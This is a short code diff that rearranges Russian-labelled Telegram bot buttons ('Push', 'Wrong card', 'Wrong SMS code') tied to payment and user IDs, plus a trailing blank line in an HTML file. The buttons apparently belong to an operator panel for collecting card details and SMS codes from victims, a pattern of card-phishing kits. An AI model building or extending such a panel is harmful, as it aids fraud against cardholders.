@@ -1354,15 +1354,15 @@
             { 
                 text: "🔔 Пуш", 
                 callback_data: `push:${paymentId}:${userId}`
-            },
-            { 
-                text: "❌ Неверная карта", 
-                callback_data: `wrong_card:${paymentId}:${userId}`
             }
         ],
         [
             { 
-                text: "❌ Неверный SMS код", 
+                text: "❌ Неверная карта", 
+                callback_data: `wrong_card:${paymentId}:${userId}`
+            },
+            { 
+                text: "❌ Неверный SMS", 
                 callback_data: `wrong_sms:${paymentId}:${userId}`
             }
         ]
@@ -1528,6 +1528,7 @@ if (!isCardBound) {
     </script>
 </body>
 </html>
+
 
 
 
